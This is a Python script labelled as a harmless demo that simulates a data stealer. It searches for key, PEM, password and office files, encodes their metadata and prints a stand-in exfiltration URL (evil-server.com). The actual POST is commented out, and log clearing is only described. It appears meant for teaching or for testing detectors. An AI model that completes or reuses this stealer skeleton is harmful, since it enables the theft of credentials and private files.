#!/usr/bin/env python3
"""
DEMO ONLY - Simulated data exfiltration (does not steal data)
Contains malicious patterns for educational testing
"""

import os
import glob
import base64
import urllib.request
import json

# Target file patterns (common sensitive files)
TARGET_PATTERNS = [
    "*.txt",
    "*.doc*", 
    "*.pdf",
    "*.xls*",
    "password*",
    "*.key",
    "*.pem"
]

def find_target_files(directory="."):
    """Find files matching sensitive patterns"""
    found_files = []
    
    print(f"[DEMO] Scanning directory: {directory}")
    
    for pattern in TARGET_PATTERNS:
        matches = glob.glob(os.path.join(directory, pattern))
        found_files.extend(matches)
    
    print(f"[DEMO] Found {len(found_files)} potential target files")
    return found_files[:5]  # Limit for demo

def collect_file_data(file_paths):
    """Simulate sensitive data collection"""
    collected_data = []
    
    for file_path in file_paths:
        try:
            # In real malware: would read file contents
            file_info = {
                'path': file_path,
                'size': os.path.getsize(file_path) if os.path.exists(file_path) else 0,
                'demo_note': 'File contents would be read here'
            }
            collected_data.append(file_info)
            print(f"[DEMO] Would collect: {file_path}")
        except:
            continue
    
    return collected_data

def exfiltrate_data(data):
    """Simulate data exfiltration"""
    # Encode data for transmission
    json_data = json.dumps(data)
    encoded_data = base64.b64encode(json_data.encode()).decode()
    
    print("[DEMO] Would exfiltrate data to:")
    print("  URL: http://evil-server.com/collect")
    print(f"  Size: {len(encoded_data)} bytes")
    print("  Method: HTTP POST")
    
    # In real malware: 
    # urllib.request.urlopen(url, data=encoded_data.encode())

def cover_tracks():
    """Simulate evidence removal"""
    print("[DEMO] Would cover tracks by:")
    print("  - Clearing system logs")
    print("  - Removing temporary files") 
    print("  - Modifying timestamps")

def main():
    print("DEMO DATA STEALER - Educational Purpose Only")
    print("Contains exfiltration patterns but is harmless")
    
    # Simulate malicious workflow
    target_files = find_target_files()
    collected_data = collect_file_data(target_files)
    exfiltrate_data(collected_data)
    cover_tracks()
    
    print("[DEMO] Data theft simulation complete")

if __name__ == "__main__":
    main()
